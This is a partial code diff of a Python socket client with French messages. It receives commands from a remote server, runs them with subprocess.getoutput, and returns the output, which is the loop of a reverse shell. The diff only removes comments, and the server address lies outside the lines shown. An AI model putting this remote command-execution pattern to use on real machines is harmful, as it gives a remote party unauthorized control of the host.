@@ -16,18 +16,14 @@ except:
     print("echec de connection avec le serveur")
 
 def send_message(client_socket, message):
-    # envoyer la longeur du message
     longueur_message = len(message.encode())
     client_socket.sendall(struct.pack("!I", longueur_message))
-    # envoyer a present le message
     client_socket.sendall(message.encode())
 
 def receive_message(client_socket):
-    # recoit d'abord la longueur du message
     get_data_len = client_socket.recv(4)
     message_len = struct.unpack("!I", get_data_len)[0]
 
-    # reception du message proprement dit
     message = b""
     while len(message) < message_len:
         chunk = message_len - len(message)
@@ -56,11 +52,9 @@ while True:
 
 
     else:
-        # envoyer au moins un octect
         output = subprocess.getoutput(command)
         len_output = len(output.encode())
         print("taille du message", len_output, "octects")
-        # envoyer au moins un octect
         if len_output == 0:
             len_output = 1
 
